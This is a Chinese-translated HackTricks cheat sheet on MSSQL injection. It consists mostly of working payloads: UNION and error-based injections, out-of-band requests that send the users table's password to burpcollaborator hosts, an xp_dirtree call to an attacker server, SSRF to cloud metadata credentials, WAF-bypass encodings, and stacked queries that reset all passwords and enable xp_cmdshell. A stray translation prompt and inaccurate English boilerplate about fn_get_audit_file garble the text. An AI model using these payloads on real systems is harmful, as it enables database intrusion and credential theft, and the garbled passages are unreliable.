# MSSQL注入

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## Active Directory枚举

可能可以通过在MSSQL服务器内部使用以下MSSQL函数来**枚举域用户的SQL注入**：

* **`SELECT DEFAULT_DOMAIN()`**：获取当前域名。
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**：如果你知道域名（在这个例子中是_DOMAIN_），这个函数将以十六进制格式返回用户Administrator的**SID**。它看起来像`0x01050000000[...]0000f401`，注意**最后4个字节**是**大端格式**中的**500**，这是**管理员用户的常见ID**。\
这个函数将允许你**知道域的ID**（除了最后4个字节）。
* **`SUSER_SNAME(0x01050000000[...]0000e803)`**：这个函数将返回指定ID的**用户名**（如果有的话），在这个例子中是**0000e803**，大端格式等于**1000**（通常这是第一个常规用户ID的ID）。然后你可以尝试从1000到2000的用户ID进行暴力破解，可能会得到域中所有用户的用户名。例如使用以下函数：
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **替代错误基于的向量**

基于错误的SQL注入通常类似于`+AND+1=@@version--`这样的结构，以及基于«OR»运算符的变体。包含这些表达式的查询通常会被WAFs阻止。为了绕过这个问题，可以使用%2b字符将字符串与触发所需数据类型转换错误的特定函数调用的结果连接起来。

以下是一些这样的函数的示例：

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

使用函数`USER_NAME()`的示例：
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

### `fn_xe_file_target_read_file`

SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种攻击技术，攻击者可以通过欺骗服务器发起伪造的请求。在MSSQL中，`fn_xe_file_target_read_file`函数可以被利用来执行SSRF攻击。
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/3.png)

**权限：** 需要在服务器上具有**`VIEW SERVER STATE`**权限。
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

`fn_get_audit_file` is a built-in function in Microsoft SQL Server that allows you to retrieve audit information from the SQL Server Audit feature. This function is used to read the audit file and return the audit records in a tabular format.

To use `fn_get_audit_file`, you need to provide the path of the audit file and specify the file type. The function supports different file types such as ERRORLOG, SECURITY_LOG, and AUDIT_LOG. You can also specify additional parameters like the initial file number and the maximum number of files to read.

Here is the syntax for using `fn_get_audit_file`:

```sql
SELECT * FROM sys.fn_get_audit_file ('audit_file_path', initial_file_number, maximum_files, file_type)
```

- `audit_file_path`: The path of the audit file.
- `initial_file_number`: The initial file number to start reading from (optional).
- `maximum_files`: The maximum number of files to read (optional).
- `file_type`: The type of audit file to read (e.g., ERRORLOG, SECURITY_LOG, AUDIT_LOG).

By using `fn_get_audit_file`, you can easily retrieve and analyze audit information from the SQL Server Audit feature. This can be useful for monitoring and troubleshooting purposes, as well as for compliance and security audits.
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/2.png)

**权限：** 需要 **`CONTROL SERVER`** 权限。
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettable`

`fn_trace_gettable` is a built-in function in Microsoft SQL Server that allows you to read the contents of a trace file and return the data as a table. This function is commonly used for troubleshooting and analyzing SQL Server trace files.

To use `fn_trace_gettable`, you need to provide the path of the trace file and specify the columns you want to retrieve. The function will then parse the trace file and return the requested data in a tabular format.

Here is the syntax for using `fn_trace_gettable`:

```sql
SELECT *
FROM fn_trace_gettable('C:\Path\To\TraceFile.trc', default)
```

In the above example, `C:\Path\To\TraceFile.trc` is the path to the trace file you want to read. The `default` parameter specifies the default file format for the trace file.

It's important to note that `fn_trace_gettable` requires the appropriate permissions to access the trace file. Additionally, you should exercise caution when using this function, as it can potentially expose sensitive information if used improperly.
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/1.png)

**权限：** 需要 **`CONTROL SERVER`** 权限。
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

在使用MSSQL时，最常见的进行网络调用的方法是使用存储过程`xp_dirtree`，这个存储过程在微软的文档中没有记录，但在互联网上被其他人[记录下来](https://www.baronsoftware.com/Blog/sql-stored-procedures-get-folder-files/)。这种方法已经在互联网上的[多个示例](https://www.notsosecure.com/oob-exploitation-cheatsheet/)中被用于[带外数据泄露](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/)的文章中。

基本上，
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\'+@user+'.attacker-server\aa"');
```
与MySQL的`LOAD_FILE`类似，您可以使用`xp_dirtree`向**仅限TCP端口445**发出网络请求。您无法控制端口号，但可以从网络共享中读取信息。

**PS：**这在默认配置下无法在运行在`Windows Server 2016 Datacenter`上的`Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)`上工作。

还有其他存储过程，例如[**`master..xp_fileexist`**](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx)或**`xp_subdirs`**可以用于类似的结果。

### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

显然，您还可以使用**`xp_cmdshell`**来执行触发**SSRF**的操作。有关更多信息，请阅读页面中的相关部分：

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQL用户定义函数 - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

编写**CLR UDF**（Common Language Runtime用户定义函数 - 使用任何**.NET**语言编写的代码，并编译为**DLL**）并在MSSQL中**加载它以进行自定义函数**非常简单。但是，这需要`dbo`访问权限，因此，除非Web应用程序连接到数据库时使用`sa`或管理员角色，否则可能无法正常工作。

[此Github存储库包含Visual Studio项目和安装说明](https://github.com/infiniteloopltd/SQLHttp)，以将二进制文件作为CLR程序集加载到MSSQL中，然后从MSSQL中调用HTTP GET请求。

[`http.cs`代码使用`WebClient`类进行GET请求并获取内容](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)，如下所示：
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString (html);
}
}
```
在安装说明中，在`CREATE ASSEMBLY`查询之前运行以下命令，将程序集的SHA512哈希添加到服务器的受信任程序集列表中（可以使用`select * from sys.trusted_assemblies;`查看列表）。
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
一旦添加了程序集并创建了函数，我们可以运行以下命令来进行HTTP请求。
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/15.png)

## **快速利用：一次查询检索整个表**

有两种简单的方法可以在一次查询中检索整个表的内容——使用FOR XML或FOR JSON子句。FOR XML子句需要指定一个模式，比如“raw”，所以从简洁性的角度来看，FOR JSON要优于它。

查询从当前数据库中检索模式、表和列的查询：
```
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/5.png)

基于错误的向量需要一个别名或名称，因为没有别名或名称的表达式的输出无法格式化为JSON。
```
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/7.png)

## **获取当前查询**

可以从访问`sys.dm_exec_requests`和`sys.dm_exec_sql_text`中获取正在执行的当前SQL查询：
```
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/9.png)

**权限：** 如果用户在服务器上具有VIEW SERVER STATE权限，则用户将看到SQL Server实例上的所有正在执行的会话；否则，用户只能看到当前会话。
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```
## **绕过WAF的小技巧**

非标准空白字符： %C2%85 或 %C2%A0:
```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```
科学（0e）和十六进制（0x）表示法用于混淆UNION：
```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```
在FROM和列名之间使用句点而不是空格：
```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```
在SELECT和一个临时列之间使用\N分隔符：
```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```
### 使用非传统的堆叠查询绕过WAF

根据[**这篇博客文章**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)，在MSSQL中可以在不使用";"的情况下堆叠查询：

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

因此，例如，多个查询可以这样写：
```sql
use [tempdb]
create table [test] ([id] int)
insert [test] values(1)
select [id] from [test]
drop table[test]
```
以下是有关黑客技术的内容。以下内容来自文件/hive/hacktricks/pentesting-web/sql-injection/mssql-injection.md。将相关的英文文本翻译成中文，并返回翻译结果，保持完全相同的markdown和html语法。请不要翻译代码、黑客技术名称、黑客术语、云/软件即服务平台名称（如Workspace、aws、gcp...）、泄漏一词、渗透测试和markdown标签。此外，请不要添加任何额外的内容，只需提供翻译和markdown语法即可。
```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```
因此，可能会绕过不考虑这种堆叠查询形式的不同WAF。例如：
```
# Adding a useless exec() at the end and making the WAF think this isn't a valid querie
admina'union select 1,'admin','testtest123'exec('select 1')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Using weirdly built queries
admin'exec('update[users]set[password]=''a''')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Or enabling xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## This will be
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```
## 参考资料

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/#MSSQL](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/#MSSQL)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在 HackTricks 中**宣传你的公司**吗？或者想要**获取 PEASS 的最新版本或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
